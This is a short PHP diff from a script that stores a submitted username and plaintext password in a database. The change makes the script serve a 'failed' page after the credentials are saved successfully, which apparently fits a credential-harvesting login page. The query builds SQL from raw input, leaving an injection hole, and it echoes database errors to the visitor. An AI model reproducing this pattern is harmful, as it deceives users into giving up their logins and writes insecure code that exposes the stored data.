@@ -22,7 +22,7 @@ $time = date("Y/m/d h:i:s a");
 $sql = "INSERT INTO users (username, password, time) VALUES('$subUser', '$subPass', '$time')";
 if($mysqli->query($sql) === true){
   //echo "Records inserted successfully.";
-  echo file_get_contents("index.html");
+  echo file_get_contents("failed.html");
 
 } else{
   echo "ERROR: Could not execute $sql. " . $mysqli->error;
